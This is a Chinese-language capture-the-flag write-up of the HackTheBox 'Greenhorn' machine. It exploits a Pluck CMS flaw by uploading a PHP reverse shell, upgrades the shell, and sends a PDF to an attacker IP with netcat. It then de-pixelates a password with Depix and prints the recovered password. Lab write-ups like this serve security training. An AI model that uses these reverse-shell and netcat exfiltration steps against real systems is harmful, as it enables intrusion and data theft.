---
title: "HTB-Greenhorn"
date: 2024-09-17
categories: 
  - "HTB-Machine"
tags: 
  - "hackthebox"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Easy |

## Basic Scan

### Nmap

![](./images/image-201.png)

### Dirsearch

![](./images/image-206.png)

找到一些敏感文件

![](./images/image-205.png)

进入`login.php`，发现pluck的版本是`4.7.18`

## CVE-2023-50564

查询相关漏洞之后，发现RCE需要先上传文件。

进入`3000`端口

![](./images/image-207.png)

找到`pass.php`，并尝试解密

![](./images/image-208.png)

![](./images/image-209.png)

![](./images/image-210.png)

登录成功，进入installmodule

![](./images/image-211.png)

这里把反弹shell文件进行压缩后上传

[php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![](./images/image-213.png)

得到反弹shell

![](./images/image-214.png)

存在两个用户，git和junior，其中junior能进去，但是没有权限读取user.txt

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

升级shell，用之前的密码尝试切换junior用户，得到user.txt

![](./images/image-215.png)

## Privilege Escalation

尝试下载这个pdf文件

使用nc连接传输

```
#靶机
junior@greenhorn:~$ nc -q 0 10.10.16.29 4321 < 'Using OpenVAS.pdf'

#kali
nc -lnvp 4321 > file.pdf
```

![](./images/image-216.png)

打开这个pdf，发现密码被打了码

![](./images/image-217.png)

Github工具：[spipm/Depix: Recovers passwords from pixelized screenshots (github.com)](https://github.com/spipm/Depix)

![](./images/image-219.png)

```
python3 depix.py -p /home/kali/Pictures/ma.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png 
```

![](./images/image-218.png)

勉强能看出是：`sidefromsidetheothersidesidefromsidetheotherside`

![](./images/image-220.png)

## Summary

做到这个题目才知道有`Depix`这种消除马赛克的东西，感觉很厉害

整体来说比较常规
